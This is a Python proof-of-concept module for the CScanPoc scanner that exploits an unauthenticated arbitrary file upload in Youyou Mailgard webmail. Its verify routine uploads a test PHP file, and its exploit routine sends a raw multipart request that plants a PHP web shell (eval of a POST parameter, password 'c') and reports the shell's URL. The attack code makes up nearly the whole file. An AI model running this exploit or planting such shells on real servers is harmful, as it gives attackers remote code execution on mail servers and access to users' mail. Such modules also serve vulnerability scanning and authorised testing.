# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Mailgard_0003'  # 平台漏洞编号，留空
    name = '佑友mailgard webmail任意文件上传导致getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-03-29'  # 漏洞公布时间
    desc = '''
        某些文件存在越权访问，无需登录即可访问，没有包含根目录下global.php的文件，都可以直接访问不会跳转到登陆界面。
        代码问题导致任意文件上传。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3039/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mailgard'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '69ed852a-6223-46d2-adec-62e1fef825d4'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            o = urllib.parse.urlparse(self.target)
            host = o.hostname
            raw = """
POST {url1}/src/big_att_upload.php HTTP/1.1
Host: {host}
Connection: keep-alive
Content-Length: 658
Origin: {url2}
X-Requested-With: ShockwaveFlash/16.0.0.305
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
Content-Type: multipart/form-data; boundary=----------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Accept: */*
Referer: {url3}/src/write_mail.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
Cookie: PHPSESSID=outb98m2mckt5a03pejd1aqra0;

------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Content-Disposition: form-data; name="Filename"

vultest.php
------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Content-Disposition: form-data; name="PHPSESSID"

outb98m2mckt5a03pejd1aqra0
------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Content-Disposition: form-data; name="dir"

/var/www/newmail/
------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Content-Disposition: form-data; name="Filedata"; filename="vultest.php"
Content-Type: application/octet-stream

<?php echo md5(c);?>
------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Content-Disposition: form-data; name="Upload"

Submit Query
------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5--
            """.format(url1=self.target, host=host, url2=self.target, url3=self.target)
            code, head, body, errcode, log = hh.http(self.target, raw=raw)

            if code == 200:
                verify_url = self.target + '/var/www/newmail/vultest.php'
                r = requests.get(verify_url)
                if '4a8a08f09d37b73795649038408b5f33' in body:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            o = urllib.parse.urlparse(self.target)
            host = o.hostname
            raw = """
POST {url1}/src/big_att_upload.php HTTP/1.1
Host: {host}
Connection: keep-alive
Content-Length: 658
Origin: {url2}
X-Requested-With: ShockwaveFlash/16.0.0.305
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
Content-Type: multipart/form-data; boundary=----------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Accept: */*
Referer: {url3}/src/write_mail.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
Cookie: PHPSESSID=outb98m2mckt5a03pejd1aqra0;

------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Content-Disposition: form-data; name="Filename"

vultest.php
------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Content-Disposition: form-data; name="PHPSESSID"

outb98m2mckt5a03pejd1aqra0
------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Content-Disposition: form-data; name="dir"

/var/www/newmail/
------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Content-Disposition: form-data; name="Filedata"; filename="vultest.php"
Content-Type: application/octet-stream

<?php echo md5(c);eval($_POST[c]);?>
------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5
Content-Disposition: form-data; name="Upload"

Submit Query
------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5--
            """.format(url1=self.target, host=host, url2=self.target, url3=self.target)
            code, head, body, errcode, log = hh.http(self.target, raw=raw)

            if code == 200:
                verify_url = self.target + '/var/www/newmail/vultest.php'
                r = requests.get(verify_url)
                if '4a8a08f09d37b73795649038408b5f33' in body:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
